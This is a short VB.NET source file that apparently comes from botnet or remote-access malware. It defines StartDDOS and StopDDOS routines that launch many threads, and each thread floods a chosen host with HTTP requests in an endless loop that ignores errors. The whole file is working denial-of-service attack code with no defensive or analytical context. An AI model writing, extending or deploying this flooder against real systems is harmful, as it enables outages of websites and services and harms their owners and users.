﻿Imports System.Net
Imports System.Threading

Friend Class HTTP
    Public Shared sFHost As String
    Public Shared Threads As Integer
    Private Shared FloodingThread As Thread()
    Private Shared FloodingJob As ThreadStart()
    Private Shared RequestClass As HTTPRequest()

    Public Shared Sub StartDDOS()
        FloodingThread = New Thread(Threads - 1) {}
        FloodingJob = New ThreadStart(Threads - 1) {}
        RequestClass = New HTTPRequest(Threads - 1) {}

        For i As Integer = 0 To Threads - 1
            RequestClass(i) = New HTTPRequest(sFHost)
            FloodingJob(i) = New ThreadStart(AddressOf RequestClass(i).Send)
            FloodingThread(i) = New Thread(FloodingJob(i))
            FloodingThread(i).Start()
        Next
    End Sub

    Public Shared Sub StopDDOS()
        For i As Integer = 0 To Threads - 1
            Try
                FloodingThread(i).Suspend()
            Catch
                FloodingThread(i).Suspend()
            End Try
        Next
    End Sub

    Private Class HTTPRequest
        Private sFHost As String
        Private wHTTP As New WebClient()

        Public Sub New(ByVal tHost As String)
            Me.sFHost = tHost
        End Sub

        Public Sub Send()
Label:
            Try
                Me.wHTTP.DownloadString(Me.sFHost)
                GoTo Label
            Catch
                GoTo Label
            End Try
        End Sub
    End Class
End Class